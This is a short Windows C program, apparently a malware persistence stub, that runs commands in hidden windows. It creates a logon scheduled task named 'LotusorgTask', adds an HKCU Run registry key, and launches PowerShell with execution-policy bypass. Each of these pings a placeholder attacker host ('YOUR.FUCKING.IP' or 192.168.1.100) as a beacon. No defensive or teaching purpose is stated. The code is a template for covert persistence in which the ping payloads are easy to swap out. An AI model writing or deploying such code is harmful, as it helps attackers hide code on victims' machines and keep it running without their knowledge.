#include <windows.h>

void run_command_hidden(const char *cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void create_task() {
    run_command_hidden("schtasks /Create /F /SC ONLOGON /TN \"LotusorgTask\" /TR \"cmd /c ping -n 1 YOUR.FUCKING.IP >nul\"");
}

void add_run_key() {
    run_command_hidden("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LotusorgRun /t REG_SZ /d \"cmd /c ping -n 1 192.168.1.100 >nul\" /f");
}

void run_powershell_payload() {
    run_command_hidden("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process cmd -ArgumentList '/c ping -n 1 192.168.1.100 >nul' -WindowStyle Hidden\"");
}

int main() {
    create_task();
    add_run_key();
    run_powershell_payload();
    return 0;
}
